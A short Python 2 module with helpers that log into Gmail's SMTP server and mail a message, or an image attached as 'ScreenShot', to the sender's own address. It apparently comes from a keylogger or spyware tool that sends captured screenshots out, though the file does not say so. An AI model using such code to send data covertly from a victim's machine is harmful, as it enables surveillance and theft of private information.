import os
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


def send_mail(email, passwd, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, passwd)
        server.sendmail(email, email, message)
        server.quit()
    except:
        print "[-] Check internet connection again!"


def attach_ImageFile(email, passwd, ImageFile):
    try:
        img_data = open(ImageFile, 'rb').read()  # attach image file to mail
        message = MIMEMultipart()
        message['Subject'] = "ScreenShot"
        text = MIMEText('ScreenShot')
        image = MIMEImage(img_data, name=os.path.basename(ImageFile))
        message.attach(image)

        server = smtplib.SMTP("smtp.gmail.com", 587)  # login and send mail
        server.starttls()
        server.login(email, passwd)
        server.sendmail(email, email, message.as_string())
        server.quit()
    except:
        print "[-] Cannot send image file to email!"
